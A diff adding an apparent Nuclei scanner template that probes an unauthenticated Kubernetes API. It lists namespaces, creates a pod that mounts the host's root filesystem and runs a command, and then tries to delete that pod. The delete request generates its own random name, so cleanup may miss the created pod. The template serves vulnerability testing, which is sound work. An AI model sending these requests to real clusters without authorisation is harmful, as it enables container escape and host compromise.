@@ -1,0 +1,57 @@
+id: kubernetes-unauthorized-rce
+
+info:
+  name: Kubernetes Unauthorized Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    When the Kubernetes service port is available, unauthorized users can execute commands inside the container.
+  remediation: |
+    Restrict access to controlled machines only.
+  tags: kubernetes, rce, unauthorized
+
+http:
+  - raw:
+      - |
+        GET /api/v1/namespaces?limit=500 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "NamespaceList"
+          - "metadata"
+          - "apiVersion"
+        part: body
+
+  - raw:
+      - |
+        POST /api/v1/namespaces/default/pods?fieldManager=kubectl-create HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"apiVersion":"v1","kind":"Pod","metadata":{"name":"mytest-app-{{rand_base(4)}}","namespace":"default"},"spec":{"containers":[{"command":["/bin/bash","-c","echo Hello Kubernetes"],"image":"nginx","name":"test-container-{{rand_base(4)}}","volumeMounts":[{"mountPath":"/mnt","name":"test-volume"}]}],"restartPolicy":"Never","volumes":[{"hostPath":{"path":"/"},"name":"test-volume"}]}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+
+  - raw:
+      - |
+        DELETE /api/v1/namespaces/default/pods/mytest-app-{{rand_base(4)}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"propagationPolicy":"Background"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
